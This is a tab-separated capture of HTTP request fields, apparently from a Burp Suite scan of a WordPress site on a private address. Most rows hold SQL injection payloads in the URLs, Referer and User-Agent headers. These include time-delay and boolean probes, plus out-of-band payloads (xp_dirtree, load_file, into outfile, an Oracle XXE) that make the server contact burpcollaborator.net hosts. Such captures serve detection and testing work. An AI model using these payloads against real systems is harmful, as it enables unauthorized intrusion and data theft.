http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1)waitfor%20delay'0%3a0%3a20'--=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1)waitfor%20delay'0%3a0%3a20'--=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/' waitfor delay'0:0:20'--	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36');declare @q varchar(99);set @q='\\r0sj83xgmyzl3d5eeq9gfoba51bzzwnngbby1mq.burpcollab'+'orator.net\xfo'; exec master.dbo.xp_dirtree @q;-- 				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%2c0)waitfor%20delay'0%3a0%3a20'--=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%2c0)waitfor%20delay'0%3a0%3a20'--=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cfp87xrm4bmo9s1u23ey44c0yup0noocf53zqpee.burpcollab'%2b'orator.net%5caew'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cfp87xrm4bmo9s1u23ey44c0yup0noocf53zqpee.burpcollab'%2b'orator.net%5caew'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1%20into%20outfile%20'%5c%5c%5c%5cij5arug75picm4o5xhs7yfu1osuqij6aay4lu9j.burpcollaborator.net%5c%5cbvt'%3b%20--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1%20into%20outfile%20'%5c%5c%5c%5cij5arug75picm4o5xhs7yfu1osuqij6aay4lu9j.burpcollaborator.net%5c%5cbvt'%3b%20--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			(select load_file('\\\\1actid7qw89vdnfoo0jqpylkfbl996xxzlu8kw9.burpcollaborator.net\\nbx'))				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/')waitfor delay'0:0:20'--	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?(select%20load_file('%5c%5c%5c%5cr4wjc31gqy3l7d9eiqdgjofa91fz30rrtfn2dq2.burpcollaborator.net%5c%5chmx'))=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?(select%20load_file('%5c%5c%5c%5cr4wjc31gqy3l7d9eiqdgjofa91fz30rrtfn2dq2.burpcollaborator.net%5c%5chmx'))=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'+(select load_file('\\\\x20pa9zmo41r5j7kgwbmhudg77d512ptshn4ds2.burpcollaborator.net\\yeo'))+'				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1'=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1'=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1'%2b(select%20load_file('%5c%5c%5c%5c6ahyii7vwd90dsfto5jvp3lpfgle9fx60uuhk59.burpcollaborator.net%5c%5cand'))%2b'=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1'%2b(select%20load_file('%5c%5c%5c%5c6ahyii7vwd90dsfto5jvp3lpfgle9fx60uuhk59.burpcollaborator.net%5c%5cand'))%2b'=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'(select*from(select(sleep(20)))a)'				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/wlwmanifest.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/wlwmanifest.xml
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1%20into%20outfile%20'%5c%5c%5c%5cw30ob80lp32q6i8jhvclitef86e425qwuko7ev3.burpcollaborator.net%5c%5cqjd'%3b%20--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1%20into%20outfile%20'%5c%5c%5c%5cw30ob80lp32q6i8jhvclitef86e425qwuko7ev3.burpcollaborator.net%5c%5cqjd'%3b%20--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'+(select*from(select(sleep(20)))a)+'				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/69417678' or '5390'='5390	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' waitfor delay'0:0:20'--				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/50421721' or '6207'='6210	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&113665256%20or%209572%3d09572=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&113665256%20or%209572%3d09572=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36')waitfor delay'0:0:20'--				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/10785416' or 3018=3018-- 	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.3654381564' or '9703'='9703				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1'=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1'=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.3657242988' or '9208'='9213				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.3680747143' or 5078=5078-- 				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?(select*from(select(sleep(20)))a)=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?(select*from(select(sleep(20)))a)=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.3654046765' or 7847=7851-- 				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/xmlrpc.php?rsd'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20grxmn%20SYSTEM%20%22http%3a%2f%2flj8drxga5sifm7o8xksayiu4ovutis6wunhd52.burpcollab'%7c%7c'orator.net%2f%22%3e%25grxmn%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/xmlrpc.php?rsd'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20grxmn%20SYSTEM%20%22http%3a%2f%2flj8drxga5sifm7o8xksayiu4ovutis6wunhd52.burpcollab'%7c%7c'orator.net%2f%22%3e%25grxmn%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/88907609' or 2079=2080-- 	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' and '5303'='5303				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
